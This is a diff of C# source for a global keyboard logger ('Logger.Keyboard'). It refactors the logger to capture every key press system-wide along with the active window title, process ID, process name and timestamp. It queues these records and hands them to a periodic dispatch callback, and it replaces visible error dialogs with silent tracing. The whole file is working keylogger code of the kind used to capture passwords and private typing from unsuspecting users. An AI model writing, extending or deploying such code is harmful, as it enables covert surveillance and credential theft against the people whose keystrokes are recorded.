@@ -4,26 +4,24 @@ using System.Collections.Generic;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-
+using System.Diagnostics;
+using System.Timers;
 
 namespace Logger.Keyboard
 {
     using WindowHandle = IntPtr;
     
-    /// <summary>
-    /// Logs keyboard events globally.
-    /// </summary>
     class KeyboardLogger
     {
-        private const int MaxTitleSize = 300;
-        private const int InitialStackSize = 5000, MaxStackSize = 80000,  nLogsPreservedOnStackTrim = 8000;
+        private const int InitialQueueSize = 5000, MaxQueueSize = 80000,  nLogsPreservedOnQueueTrim = 8000;
 
-        private readonly int dispatchInterval;
-        private readonly object dispatchSyncObj = new object();
-        private KeyboardListener listener;
-        private Stack<Keylog> stack;
-        private readonly object stackSyncObj = new object();
-        private System.Threading.Timer dispatchTimer;
+        private Queue<Keylog> queue;
+        private Queue<Keylog> sendBuffer;
+
+        private readonly object QueueSyncObj = new object();
+        private readonly object DispatchSyncObj = new object();
+
+        private System.Timers.Timer dispatchTimer;
         private Func<IEnumerable<Keylog>, bool> OnDispatch;
 
         static string Escape(string text)
@@ -33,16 +31,20 @@ namespace Logger.Keyboard
             return text;
         }
 
-        public KeyboardLogger(KeyboardListener listener, int dispatchIntervalMilliseconds, Func<IEnumerable<Keylog>, bool> OnDispatch)
+        public KeyboardLogger(KeyboardListener listener, TimeSpan dispatchInterval, Func<IEnumerable<Keylog>, bool> OnDispatch)
         {
-            this.listener = listener;
-            this.stack = new Stack<Keylog>(InitialStackSize);
+            this.queue = new Queue<Keylog>(InitialQueueSize);
+            this.sendBuffer = new Queue<Keylog>();
+
             this.OnDispatch = OnDispatch;
-            this.dispatchInterval = dispatchIntervalMilliseconds;
-            this.dispatchTimer = new System.Threading.Timer(new TimerCallback(DispatchTimerElapsed), null, dispatchIntervalMilliseconds, dispatchIntervalMilliseconds);
-            
-            this.listener.KeyDown += new RawKeyEventHandler(OnKeyDown);
-            this.listener.KeyUp += new RawKeyEventHandler(OnKeyUp);
+
+            listener.KeyDown += new RawKeyEventHandler(OnKeyDown);
+            listener.KeyUp += new RawKeyEventHandler(OnKeyUp);
+
+            this.dispatchTimer = new System.Timers.Timer(dispatchInterval.TotalMilliseconds);
+            this.dispatchTimer.AutoReset = false;
+            this.dispatchTimer.Elapsed += DispatchTimerElapsed;
+            this.dispatchTimer.Start();
         }
 
         public void Flush()
@@ -55,16 +57,16 @@ namespace Logger.Keyboard
             try
             {
                 var keyRepresentation = args.Key.ToString();
-                var keyDownLog = string.Format("[{0} down]", Escape(keyRepresentation));
+                var log = string.Format("[{0} down]", Escape(keyRepresentation));
 
-                this.EnqueueLog(keyDownLog);
+                this.EnqueueLog(Keylog.Create(log, args));
 
                 if (!string.IsNullOrEmpty(args.Character))
-                    this.EnqueueLog(args.Character);
+                    this.EnqueueLog(Keylog.Create(args.Character, args));
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                Program.Trace($"OnKeyDown: { ex.Message }");
             }
         }
 
@@ -73,76 +75,72 @@ namespace Logger.Keyboard
             try 
             {
                 var keyRepresentation = args.Key.ToString();
-                var keyUpLog = string.Format("[{0} up]", Escape(keyRepresentation));
+                var log = string.Format("[{0} up]", Escape(keyRepresentation));
 
-                this.EnqueueLog(keyUpLog);
+                this.EnqueueLog(Keylog.Create(log, args));
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                Program.Trace($"OnKeyUp: { ex.Message }");
             }
         }
 
-        private void EnqueueLog(string log)
+        private void EnqueueLog(Keylog log)
         {
-            WindowHandle windowHandle = WinAPI.GetForegroundWindow();
+            lock (QueueSyncObj)
+                this.queue.Enqueue(log);
 
-            StringBuilder windowTitle = new StringBuilder(MaxTitleSize);
-            WinAPI.GetWindowText(windowHandle, windowTitle, MaxTitleSize);
-
-            var keylog = new Keylog(log, windowHandle, windowTitle.ToString());
-
-            lock (stackSyncObj)
-                this.stack.Push(keylog);
-
-            TrimStackIfNecessary();
+            TrimQueueIfNecessary();
         }
 
-        private void TrimStackIfNecessary()
+        void TrimQueueIfNecessary()
         {
-            lock (stackSyncObj)
+            lock (QueueSyncObj)
             {
-                if (this.stack.Count <= MaxStackSize)
+                if (this.queue.Count <= MaxQueueSize)
                     return;
-            
-                var preservedLogs = new Stack<Keylog>(stack.Take(nLogsPreservedOnStackTrim));
+            }
 
-                if (preservedLogs.Count < InitialStackSize)
-                    this.stack = new Stack<Keylog>(InitialStackSize);
-                else
-                    this.stack = new Stack<Keylog>(preservedLogs.Count * 2);
-
-                foreach (var item in preservedLogs)
-                    this.stack.Push(item);
+            lock (DispatchSyncObj)  // Do not allow dispatching (which means dequeueing) while trimming queue, also limit trimming to be done by one thread at once
+            {
+                while (true)
+                {
+                    lock (QueueSyncObj)
+                    {
+                        if (this.queue.Count > nLogsPreservedOnQueueTrim)
+                            queue.Dequeue();
+                        else
+                            break;
+                    }
+                }
             }
         }
 
-        private void DispatchTimerElapsed(object obj)
+
+        private void DispatchTimerElapsed(object sender, EventArgs e)
         {
             TryDispatch();
-            ResetDispatchTimer();
-        }
-
-        private void ResetDispatchTimer()
-        {
-            this.dispatchTimer.Change(this.dispatchInterval, this.dispatchInterval);
+            Debug.Assert(this.dispatchTimer.Enabled == false);
+            this.dispatchTimer.Start();
         }
 
         private void TryDispatch()
         {
-            lock (stackSyncObj)
+            lock (DispatchSyncObj)
             {
-                int amount = stack.Count;
-
-                if (amount <= 0)
-                    return;
-
-                bool success = OnDispatch(stack.Take(amount));
-
-                if (success)
+                // TODO: put a limit on sendbuffer size
+                while (queue.Count > 0 && sendBuffer.Count < int.MaxValue)
                 {
-                    for (int i = 0; i < amount; i++)
-                        stack.Pop();
+                    lock (QueueSyncObj)
+                        sendBuffer.Enqueue(queue.Dequeue());
+                }
+
+                if (sendBuffer.Count > 0)
+                {
+                    bool success = OnDispatch(sendBuffer);
+
+                    if (success)
+                        sendBuffer.Clear();
                 }
             }
         }
@@ -150,31 +148,31 @@ namespace Logger.Keyboard
    
     class Keylog
     {
-
-        string log;
-        string windowTitle;
-        WindowHandle windowHandle;
-
-        public string Log
+        public static Keylog Create(string log, RawKeyEventArgs args)
         {
-            get { return this.log; }
+            return new Keylog(log, args.DateTime, args.WindowHandle, args.WindowTitle, args.ProcessID, args.ProcessName);
         }
 
-        public string WindowTitle
-        {
-            get { return this.windowTitle; }
-        }
+        public DateTime DateTime { get; set; }
 
-        public WindowHandle WindowHandle
-        {
-            get { return this.windowHandle; }
-        }
+        public string Log { get; private set; }
 
-        public Keylog (string log, WindowHandle windowHandle, string windowTitle)
+        public string WindowTitle { get; private set; }
+
+        public WindowHandle WindowHandle { get; private set; }
+
+        public uint ProcessID { get; private set; }
+
+        public string ProcessName { get; private set; }
+
+        public Keylog (string log, DateTime dateTime, WindowHandle windowHandle, string windowTitle, uint processID, string processName)
         {
-            this.log = log;
-            this.windowHandle = windowHandle;
-            this.windowTitle = windowTitle;
+            Log = log;
+            WindowHandle = windowHandle;
+            WindowTitle = windowTitle;
+            ProcessID = processID;
+            ProcessName = processName;
+            DateTime = dateTime;
         }
     }
 }
